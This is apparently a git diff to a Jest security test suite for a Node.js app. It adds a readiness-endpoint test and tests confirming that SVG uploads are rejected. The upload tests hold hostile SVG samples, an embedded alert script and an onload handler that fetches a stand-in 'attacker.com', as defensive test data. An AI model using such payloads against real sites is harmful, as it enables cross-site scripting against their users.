@@ -9,6 +9,7 @@ jest.mock("../utils/mailSender", () => jest.fn().mockResolvedValue({ messageId: 
 
 const app = require("../index");
 const User = require("../models/User");
+const database = require("../config/database");
 const {
     validateUploadedFile,
     detectBinaryFormat,
@@ -120,7 +121,33 @@ describe("QA Cycle #14 Security Controls (SEC-005, SEC-007, SEC-008)", () => {
             expect(status).toHaveProperty("mode");
             expect(status).toHaveProperty("redisConnected");
             expect(status).toHaveProperty("isDistributed");
-            expect(["distributed_redis", "in_memory"]).toContain(status.mode);
+            expect(["distributed_redis", "in_memory", "in_memory_fallback"]).toContain(status.mode);
+        });
+
+        it("GET /readyz returns operational status and respects distributed requirement", async () => {
+            const dbSpy = jest.spyOn(database, "getDatabaseHealth").mockReturnValue({ healthy: true, state: "connected" });
+
+            try {
+                const res = await request(app).get("/readyz");
+                expect(res.status).toBe(200);
+                expect(res.body.status).toBe("ready");
+                expect(res.body).toHaveProperty("database");
+                expect(res.body).toHaveProperty("rateLimiter");
+
+                // Verify requirement gating
+                const origEnv = process.env.REQUIRE_DISTRIBUTED_RATE_LIMITING;
+                try {
+                    process.env.REQUIRE_DISTRIBUTED_RATE_LIMITING = "true";
+                    const resDegraded = await request(app).get("/readyz");
+                    expect(resDegraded.status).toBe(503);
+                    expect(resDegraded.body.status).toBe("degraded");
+                    expect(resDegraded.body.degraded).toBe(true);
+                } finally {
+                    process.env.REQUIRE_DISTRIBUTED_RATE_LIMITING = origEnv;
+                }
+            } finally {
+                dbSpy.mockRestore();
+            }
         });
     });
 
@@ -188,6 +215,20 @@ describe("QA Cycle #14 Security Controls (SEC-005, SEC-007, SEC-008)", () => {
             expect(fs.existsSync(temp.tempFilePath)).toBe(true);
             cleanupTempFile(temp);
             expect(fs.existsSync(temp.tempFilePath)).toBe(false);
+        });
+
+        it("rejects SVG image uploads due to script-execution and XSS risks", () => {
+            const svgFile = createTempFile("icon.svg", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "utf8"));
+            const res = validateUploadedFile(svgFile, { expectedCategory: "image" });
+            expect(res.valid).toBe(false);
+            expect(res.message).toMatch(/SVG image uploads are not permitted/i);
+        });
+
+        it("rejects SVG payload disguised as a PNG extension", () => {
+            const disguisedSvg = createTempFile("sneaky.png", Buffer.from('<svg onload="fetch(\'https://attacker.com\')"></svg>', "utf8"));
+            const res = validateUploadedFile(disguisedSvg, { expectedCategory: "image" });
+            expect(res.valid).toBe(false);
+            expect(res.message).toMatch(/SVG image uploads are not permitted/i);
         });
     });
 });
